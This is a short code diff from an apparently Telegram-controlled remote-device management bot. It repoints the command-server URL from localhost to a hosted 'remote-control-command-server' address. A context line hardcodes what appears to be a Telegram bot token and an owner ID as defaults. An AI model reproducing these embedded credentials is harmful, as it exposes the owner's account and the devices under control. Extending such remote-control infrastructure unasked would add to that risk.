@@ -45,7 +45,7 @@ BOT_TOKEN = os.environ.get('TELEGRAM_BOT_TOKEN', "7305811865:AAF_PKkBWEUw-QdL1ee
 OWNER_USER_ID = int(os.environ.get('OWNER_USER_ID', 985612253))
 bot = telebot.TeleBot(BOT_TOKEN)
 DB_FILE = 'devices.db'
-COMMAND_SERVER_URL = 'http://localhost:4000'
+COMMAND_SERVER_URL = os.environ.get('COMMAND_SERVER_URL', 'https://remote-control-command-server.onrender.com')
 
 # تخزين الجلسات النشطة
 active_sessions = {}
